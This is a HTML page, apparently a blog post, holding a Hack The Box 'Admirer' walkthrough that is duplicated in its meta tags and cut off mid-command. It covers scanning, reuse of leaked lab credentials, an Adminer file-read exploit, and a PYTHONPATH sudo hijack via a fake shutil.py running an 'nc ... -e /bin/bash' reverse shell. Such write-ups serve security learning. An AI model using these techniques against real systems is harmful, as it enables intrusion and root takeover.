@@ -1,0 +1,745 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Admirer" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.187 admirer.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ nmap -sV -sT -sC admirer.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 07:58 EDT Nmap scan report for admirer.htb (10.10.10.187) Host is up (0.19s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA) | 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA) |_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/admin-dir |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Admirer Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.47 seconds Enumeration (1) There was no anonymous access for the ftp service on port 21 and we didn’t have any credentials for the ssh service on port 22 so lets move straight to the http service on port 80. Very nice home page but its not linked to any useful pages. Hmm… Lets check out robots.txt. Unfortunately, accessing http://admirer.htb/admin-dir/ led to a 403, so I think its time to bust out the directory brute-forcer. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ gobuster dir -u http://admirer.htb/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 12 -k -x .php,.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://admirer.htb/admin-dir [+] Threads: 12 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2020/05/28 08:31:50 Starting gobuster =============================================================== /contacts.txt (Status: 200) /credentials.txt (Status: 200) Lets visit them. http://admirer.htb/admin-dir/contacts.txt: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ########## # admins # ########## # Penny Email: p.wise@admirer.htb ############## # developers # ############## # Rajesh Email: r.nayyar@admirer.htb # Amy Email: a.bialik@admirer.htb # Leonard Email: l.galecki@admirer.htb ############# # designers # ############# # Howard Email: h.helberg@admirer.htb # Bernadette Email: b.rauch@admirer.htb http://admirer.htb/admin-dir/credentials.txt: 1 2 3 4 5 6 7 8 9 10 11 [Internal mail account] w.cooper@admirer.htb fgJr6q#S\W:$P [FTP account] ftpuser %n?4Wz}R$tTF7 [Wordpress account] admin w0rdpr3ss01! Using the ftp credentials we found, we can go back to the ftp service. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ ftp admirer.htb Connected to admirer.htb. 220 (vsFTPd 3.0.3) Name (admirer.htb:root): ftpuser 331 Please specify the password. Password: %n?4Wz}R$tTF7 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 3405 Dec 02 2019 dump.sql -rw-r--r-- 1 0 0 5270987 Dec 03 2019 html.tar.gz 226 Directory send OK. We see 2 files so lets download them and analyse them. The dump.sql contained nothing useful so lets see what’s inside of html.tar.gz 1 2 3 4 5 6 7 8 9 10 11 12 $ tar -xvf html.tar.gz $ ls -al total 5188 drwxr-xr-x 6 root root 4096 May 28 08:43 . drwxr-xr-x 27 root root 4096 Aug 22 05:34 .. drwxr-x--- 6 root www-data 4096 Jun 6 2019 assets -rw-r--r-- 1 root root 5270987 May 28 08:42 html.tar.gz drwxr-x--- 4 root www-data 4096 Dec 2 2019 images -rw-r----- 1 root www-data 4613 Dec 3 2019 index.php -rw-r----- 1 root www-data 134 Dec 1 2019 robots.txt drwxr-x--- 2 root www-data 4096 May 28 09:38 utility-scripts drwxr-x--- 2 root www-data 4096 Dec 2 2019 w4ld0s_s3cr3t_d1r In this folder were 3 interesting files. 1 2 3 4 5 6 7 8 $ index.php ... &lt;?php $servername = &quot;localhost&quot;; $username = &quot;waldo&quot;; $password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;; $dbname = &quot;admirerdb&quot;; ... Alright, we got one set of credentials. In utility-scripts, there was a admin_tasks.php. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 &lt;html&gt; &lt;head&gt; &lt;title&gt;Administrative Tasks&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h3&gt;Admin Tasks Web Interface (v0.01 beta)&lt;/h3&gt; &lt;?php // Web Interface to the admin_tasks script // if(isset($_REQUEST[&#39;task&#39;])) { $task = $_REQUEST[&#39;task&#39;]; if($task == &#39;1&#39; || $task == &#39;2&#39; || $task == &#39;3&#39; || $task == &#39;4&#39; || $task == &#39;5&#39; || $task == &#39;6&#39; || $task == &#39;7&#39;) { /*********************************************************************************** Available options: 1) View system uptime 2) View logged in users 3) View crontab (current user only) 4) Backup passwd file (not working) 5) Backup shadow file (not working) 6) Backup web data (not working) 7) Backup database (not working) NOTE: Options 4-7 are currently NOT working because they need root privileges. I&#39;m leaving them in the valid tasks in case I figure out a way to securely run code as root from a PHP page. ************************************************************************************/ echo str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, shell_exec(&quot;/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1&quot;)); } else { echo(&quot;Invalid task.&quot;); } } ?&gt; &lt;p&gt; &lt;h4&gt;Select task:&lt;/p&gt; &lt;form method=&quot;POST&quot;&gt; &lt;select name=&quot;task&quot;&gt; &lt;option value=1&gt;View system uptime&lt;/option&gt; &lt;option value=2&gt;View logged in users&lt;/option&gt; &lt;option value=3&gt;View crontab&lt;/option&gt; &lt;option value=4 disabled&gt;Backup passwd file&lt;/option&gt; &lt;option value=5 disabled&gt;Backup shadow file&lt;/option&gt; &lt;option value=6 disabled&gt;Backup web data&lt;/option&gt; &lt;option value=7 disabled&gt;Backup database&lt;/option&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; If we visit it, this is how it looks: We can’t inject any arbitrary commands into the shell_exec since the if check is pretty tight. Moving on, there was another file called db_admin.php. 1 2 3 4 5 6 7 8 9 10 $ cat utility-scripts/db_admin.php ... $servername = &quot;localhost&quot;; $username = &quot;waldo&quot;; $password = &quot;Wh3r3_1s_w4ld0?&quot;; // Create connection $conn = new mysqli($servername, $username, $password); ... // TODO: Finish implementing this or find a better open source alternative Cool we found some database credentials but we can’t use them yet. However this page doesn’t exist anymore. Could it have to do with the comment in db_admin.php? I consulted the forums and people were saying that the name of this box was a hint. I went to google “open source admirer” and I found what they were talking about. 1 2 3 Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB. ... Usage: Just put the file adminer.css alongside adminer.php. The usage tells us that there is a adminer.php, so lets see if it’s there. http://admirer.htb/utility-scripts/adminer.php: Exploitation (1) We found our next lead! I tested out the credentials we found but they were incorrect :( Maybe the files we found were outdated? Searching online, this version of Adminer (4.6.2) has a vulnerability which allows us to read files on the web server. I followed this guide which allowed to me read index.php on the web server. First, we will need a SQL server. Fortunately, Kali Linux already comes with MariaDB installed so all we have to do is start it. 1 $ systemctl start mysql Next, we will need to create a new account and assign privileges to it. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ mysql Welcome to the MariaDB monitor. Commands end with ; or \g. Your MariaDB connection id is 39 Server version: 10.3.20-MariaDB-1 Debian buildd-unstable Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement. MariaDB [(none)]&gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [(none)]&gt; CREATE USER &#39;root&#39;@&#39;admirer.htb&#39; IDENTIFIED BY &#39;toor&#39;; Query OK, 0 rows affected (0.000 sec) MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON * . * TO &#39;root&#39;@&#39;admirer.htb&#39;; Query OK, 0 rows affected (0.000 sec) Now we can use adminer.php to access our MariaDB server by entering our attacker’s machine IP Address as the Server, root as the username and toor as the password. The database field can be left blank. We then need to create a new database and new table inside it. Now, we can proceed to load the contents of index.php into the table we made. And finally, we can view the contents of index.php. We can use these new credentials to login to the database on the box but there was only one table which contained nothing useful. user.txt Thinking back, there was a ssh service running port 22. Perhaps we can ssh with the credentials? 1 2 3 4 $ ssh waldo@admirer.htb waldo@admirer.htb&#39;s password: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt; waldo@admirer:~$ cat user.txt a9f7XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) As waldo, we got sudo rights to run /opt/scripts/admin_tasks.sh. 1 2 3 4 5 6 7 waldo@admirer:~$ sudo -l [sudo] password for waldo: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt; Matching Defaults entries for waldo on admirer: env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always User waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.sh Lets see what’s inside. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh #!/bin/bash view_uptime() { /usr/bin/uptime -p } view_users() { /usr/bin/w } view_crontab() { /usr/bin/crontab -l } backup_passwd() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot; /bin/cp /etc/passwd /var/backups/passwd.bak /bin/chown root:root /var/backups/passwd.bak /bin/chmod 600 /var/backups/passwd.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } backup_shadow() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot; /bin/cp /etc/shadow /var/backups/shadow.bak /bin/chown root:shadow /var/backups/shadow.bak /bin/chmod 600 /var/backups/shadow.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } backup_web() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running backup script in the background, it might take a while...&quot; /opt/scripts/backup.py &amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } backup_db() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running mysqldump in the background, it may take a while...&quot; #/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp; /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } # Non-interactive way, to be used by the web interface if [ $# -eq 1 ] then option=$1 case $option in 1) view_uptime ;; 2) view_users ;; 3) view_crontab ;; 4) backup_passwd ;; 5) backup_shadow ;; 6) backup_web ;; 7) backup_db ;; *) echo &quot;Unknown option.&quot; &gt;&amp;2 esac exit 0 fi # Interactive way, to be called from the command line options=(&quot;View system uptime&quot; &quot;View logged in users&quot; &quot;View crontab&quot; &quot;Backup passwd file&quot; &quot;Backup shadow file&quot; &quot;Backup web data&quot; &quot;Backup DB&quot; &quot;Quit&quot;) echo echo &quot;[[[ System Administration Menu ]]]&quot; PS3=&quot;Choose an option: &quot; COLUMNS=11 select opt in &quot;${options[@]}&quot;; do case $REPLY in 1) view_uptime ; break ;; 2) view_users ; break ;; 3) view_crontab ; break ;; 4) backup_passwd ; break ;; 5) backup_shadow ; break ;; 6) backup_web ; break ;; 7) backup_db ; break ;; 8) echo &quot;Bye!&quot; ; break ;; *) echo &quot;Unknown option.&quot; &gt;&amp;2 esac done exit 0 It’s quite long but if we zoom in to the backup_web function, we see that it is running a python script /opt/scripts/backup.py. 1 2 3 4 5 6 7 8 9 10 11 12 13 waldo@admirer:~$ cat /opt/scripts/backup.py #!/usr/bin/python3 from shutil import make_archive src = &#39;/var/www/html/&#39; # old ftp directory, not used anymore #dst = &#39;/srv/ftp/html&#39; dst = &#39;/var/backups/html&#39; make_archive(dst, &#39;gztar&#39;, src) This script simply creates a .tar.gz file from the contents of /var/backups/html. Exploitation (2) Hmm… How does the SETENV in the sudo rights come into place? With SETENV, we are able to set/modify environment variables when running the script with sudo. For example, I can do this: sudo x=something /opt/scripts/admin_tasks.sh and the script will run with the environment variable x set to something. Since we know that the script executes make_archive from the shutil module, what we can do is create a fake shutil module with a fake make_archive function and modify the $PYTHONPATH variable to point to the location of our fake module and run the script! The $PYTHONPATH contains a list of additional directories where Python looks for modules for importing. 1 2 3 4 5 6 waldo@admirer:~$ cat shutil.py import os def make_archive(a,b,c): os.system(&quot;nc 10.10.XX.XX 1337 -e /bin/bash&quot;) Now, all we have to do is run admin_task.sh. 1 2 3 4 5 6 7 8 9 10 11 12 13 waldo@admirer:/tmp$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh [[[ System Administration Menu ]]] 1) View system uptime 2) View logged in users 3) View crontab 4) Backup passwd file 5) Backup shadow file 6) Backup web data 7) Backup DB 8) Quit Choose an option: 6 Running backup script in the background, it might take a while... root.txt And on our listener we prepared beforehand, 1 2 3 4 5 6 7 $ nv -lvnp 1337 listening on [any] 1337 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.187] 56858 id uid=0(root) gid=0(root) groups=0(root) cat /root/root.txt 5049XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.187 admirer.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ nmap -sV -sT -sC admirer.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 07:58 EDT Nmap scan report for admirer.htb (10.10.10.187) Host is up (0.19s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA) | 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA) |_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/admin-dir |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Admirer Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.47 seconds Enumeration (1) There was no anonymous access for the ftp service on port 21 and we didn’t have any credentials for the ssh service on port 22 so lets move straight to the http service on port 80. Very nice home page but its not linked to any useful pages. Hmm… Lets check out robots.txt. Unfortunately, accessing http://admirer.htb/admin-dir/ led to a 403, so I think its time to bust out the directory brute-forcer. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ gobuster dir -u http://admirer.htb/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 12 -k -x .php,.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://admirer.htb/admin-dir [+] Threads: 12 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2020/05/28 08:31:50 Starting gobuster =============================================================== /contacts.txt (Status: 200) /credentials.txt (Status: 200) Lets visit them. http://admirer.htb/admin-dir/contacts.txt: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ########## # admins # ########## # Penny Email: p.wise@admirer.htb ############## # developers # ############## # Rajesh Email: r.nayyar@admirer.htb # Amy Email: a.bialik@admirer.htb # Leonard Email: l.galecki@admirer.htb ############# # designers # ############# # Howard Email: h.helberg@admirer.htb # Bernadette Email: b.rauch@admirer.htb http://admirer.htb/admin-dir/credentials.txt: 1 2 3 4 5 6 7 8 9 10 11 [Internal mail account] w.cooper@admirer.htb fgJr6q#S\W:$P [FTP account] ftpuser %n?4Wz}R$tTF7 [Wordpress account] admin w0rdpr3ss01! Using the ftp credentials we found, we can go back to the ftp service. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ ftp admirer.htb Connected to admirer.htb. 220 (vsFTPd 3.0.3) Name (admirer.htb:root): ftpuser 331 Please specify the password. Password: %n?4Wz}R$tTF7 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 3405 Dec 02 2019 dump.sql -rw-r--r-- 1 0 0 5270987 Dec 03 2019 html.tar.gz 226 Directory send OK. We see 2 files so lets download them and analyse them. The dump.sql contained nothing useful so lets see what’s inside of html.tar.gz 1 2 3 4 5 6 7 8 9 10 11 12 $ tar -xvf html.tar.gz $ ls -al total 5188 drwxr-xr-x 6 root root 4096 May 28 08:43 . drwxr-xr-x 27 root root 4096 Aug 22 05:34 .. drwxr-x--- 6 root www-data 4096 Jun 6 2019 assets -rw-r--r-- 1 root root 5270987 May 28 08:42 html.tar.gz drwxr-x--- 4 root www-data 4096 Dec 2 2019 images -rw-r----- 1 root www-data 4613 Dec 3 2019 index.php -rw-r----- 1 root www-data 134 Dec 1 2019 robots.txt drwxr-x--- 2 root www-data 4096 May 28 09:38 utility-scripts drwxr-x--- 2 root www-data 4096 Dec 2 2019 w4ld0s_s3cr3t_d1r In this folder were 3 interesting files. 1 2 3 4 5 6 7 8 $ index.php ... &lt;?php $servername = &quot;localhost&quot;; $username = &quot;waldo&quot;; $password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;; $dbname = &quot;admirerdb&quot;; ... Alright, we got one set of credentials. In utility-scripts, there was a admin_tasks.php. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 &lt;html&gt; &lt;head&gt; &lt;title&gt;Administrative Tasks&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h3&gt;Admin Tasks Web Interface (v0.01 beta)&lt;/h3&gt; &lt;?php // Web Interface to the admin_tasks script // if(isset($_REQUEST[&#39;task&#39;])) { $task = $_REQUEST[&#39;task&#39;]; if($task == &#39;1&#39; || $task == &#39;2&#39; || $task == &#39;3&#39; || $task == &#39;4&#39; || $task == &#39;5&#39; || $task == &#39;6&#39; || $task == &#39;7&#39;) { /*********************************************************************************** Available options: 1) View system uptime 2) View logged in users 3) View crontab (current user only) 4) Backup passwd file (not working) 5) Backup shadow file (not working) 6) Backup web data (not working) 7) Backup database (not working) NOTE: Options 4-7 are currently NOT working because they need root privileges. I&#39;m leaving them in the valid tasks in case I figure out a way to securely run code as root from a PHP page. ************************************************************************************/ echo str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, shell_exec(&quot;/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1&quot;)); } else { echo(&quot;Invalid task.&quot;); } } ?&gt; &lt;p&gt; &lt;h4&gt;Select task:&lt;/p&gt; &lt;form method=&quot;POST&quot;&gt; &lt;select name=&quot;task&quot;&gt; &lt;option value=1&gt;View system uptime&lt;/option&gt; &lt;option value=2&gt;View logged in users&lt;/option&gt; &lt;option value=3&gt;View crontab&lt;/option&gt; &lt;option value=4 disabled&gt;Backup passwd file&lt;/option&gt; &lt;option value=5 disabled&gt;Backup shadow file&lt;/option&gt; &lt;option value=6 disabled&gt;Backup web data&lt;/option&gt; &lt;option value=7 disabled&gt;Backup database&lt;/option&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; If we visit it, this is how it looks: We can’t inject any arbitrary commands into the shell_exec since the if check is pretty tight. Moving on, there was another file called db_admin.php. 1 2 3 4 5 6 7 8 9 10 $ cat utility-scripts/db_admin.php ... $servername = &quot;localhost&quot;; $username = &quot;waldo&quot;; $password = &quot;Wh3r3_1s_w4ld0?&quot;; // Create connection $conn = new mysqli($servername, $username, $password); ... // TODO: Finish implementing this or find a better open source alternative Cool we found some database credentials but we can’t use them yet. However this page doesn’t exist anymore. Could it have to do with the comment in db_admin.php? I consulted the forums and people were saying that the name of this box was a hint. I went to google “open source admirer” and I found what they were talking about. 1 2 3 Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB. ... Usage: Just put the file adminer.css alongside adminer.php. The usage tells us that there is a adminer.php, so lets see if it’s there. http://admirer.htb/utility-scripts/adminer.php: Exploitation (1) We found our next lead! I tested out the credentials we found but they were incorrect :( Maybe the files we found were outdated? Searching online, this version of Adminer (4.6.2) has a vulnerability which allows us to read files on the web server. I followed this guide which allowed to me read index.php on the web server. First, we will need a SQL server. Fortunately, Kali Linux already comes with MariaDB installed so all we have to do is start it. 1 $ systemctl start mysql Next, we will need to create a new account and assign privileges to it. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ mysql Welcome to the MariaDB monitor. Commands end with ; or \g. Your MariaDB connection id is 39 Server version: 10.3.20-MariaDB-1 Debian buildd-unstable Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement. MariaDB [(none)]&gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [(none)]&gt; CREATE USER &#39;root&#39;@&#39;admirer.htb&#39; IDENTIFIED BY &#39;toor&#39;; Query OK, 0 rows affected (0.000 sec) MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON * . * TO &#39;root&#39;@&#39;admirer.htb&#39;; Query OK, 0 rows affected (0.000 sec) Now we can use adminer.php to access our MariaDB server by entering our attacker’s machine IP Address as the Server, root as the username and toor as the password. The database field can be left blank. We then need to create a new database and new table inside it. Now, we can proceed to load the contents of index.php into the table we made. And finally, we can view the contents of index.php. We can use these new credentials to login to the database on the box but there was only one table which contained nothing useful. user.txt Thinking back, there was a ssh service running port 22. Perhaps we can ssh with the credentials? 1 2 3 4 $ ssh waldo@admirer.htb waldo@admirer.htb&#39;s password: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt; waldo@admirer:~$ cat user.txt a9f7XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) As waldo, we got sudo rights to run /opt/scripts/admin_tasks.sh. 1 2 3 4 5 6 7 waldo@admirer:~$ sudo -l [sudo] password for waldo: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt; Matching Defaults entries for waldo on admirer: env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always User waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.sh Lets see what’s inside. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh #!/bin/bash view_uptime() { /usr/bin/uptime -p } view_users() { /usr/bin/w } view_crontab() { /usr/bin/crontab -l } backup_passwd() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot; /bin/cp /etc/passwd /var/backups/passwd.bak /bin/chown root:root /var/backups/passwd.bak /bin/chmod 600 /var/backups/passwd.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } backup_shadow() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot; /bin/cp /etc/shadow /var/backups/shadow.bak /bin/chown root:shadow /var/backups/shadow.bak /bin/chmod 600 /var/backups/shadow.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } backup_web() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running backup script in the background, it might take a while...&quot; /opt/scripts/backup.py &amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } backup_db() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running mysqldump in the background, it may take a while...&quot; #/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp; /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } # Non-interactive way, to be used by the web interface if [ $# -eq 1 ] then option=$1 case $option in 1) view_uptime ;; 2) view_users ;; 3) view_crontab ;; 4) backup_passwd ;; 5) backup_shadow ;; 6) backup_web ;; 7) backup_db ;; *) echo &quot;Unknown option.&quot; &gt;&amp;2 esac exit 0 fi # Interactive way, to be called from the command line options=(&quot;View system uptime&quot; &quot;View logged in users&quot; &quot;View crontab&quot; &quot;Backup passwd file&quot; &quot;Backup shadow file&quot; &quot;Backup web data&quot; &quot;Backup DB&quot; &quot;Quit&quot;) echo echo &quot;[[[ System Administration Menu ]]]&quot; PS3=&quot;Choose an option: &quot; COLUMNS=11 select opt in &quot;${options[@]}&quot;; do case $REPLY in 1) view_uptime ; break ;; 2) view_users ; break ;; 3) view_crontab ; break ;; 4) backup_passwd ; break ;; 5) backup_shadow ; break ;; 6) backup_web ; break ;; 7) backup_db ; break ;; 8) echo &quot;Bye!&quot; ; break ;; *) echo &quot;Unknown option.&quot; &gt;&amp;2 esac done exit 0 It’s quite long but if we zoom in to the backup_web function, we see that it is running a python script /opt/scripts/backup.py. 1 2 3 4 5 6 7 8 9 10 11 12 13 waldo@admirer:~$ cat /opt/scripts/backup.py #!/usr/bin/python3 from shutil import make_archive src = &#39;/var/www/html/&#39; # old ftp directory, not used anymore #dst = &#39;/srv/ftp/html&#39; dst = &#39;/var/backups/html&#39; make_archive(dst, &#39;gztar&#39;, src) This script simply creates a .tar.gz file from the contents of /var/backups/html. Exploitation (2) Hmm… How does the SETENV in the sudo rights come into place? With SETENV, we are able to set/modify environment variables when running the script with sudo. For example, I can do this: sudo x=something /opt/scripts/admin_tasks.sh and the script will run with the environment variable x set to something. Since we know that the script executes make_archive from the shutil module, what we can do is create a fake shutil module with a fake make_archive function and modify the $PYTHONPATH variable to point to the location of our fake module and run the script! The $PYTHONPATH contains a list of additional directories where Python looks for modules for importing. 1 2 3 4 5 6 waldo@admirer:~$ cat shutil.py import os def make_archive(a,b,c): os.system(&quot;nc 10.10.XX.XX 1337 -e /bin/bash&quot;) Now, all we have to do is run admin_task.sh. 1 2 3 4 5 6 7 8 9 10 11 12 13 waldo@admirer:/tmp$ sudo 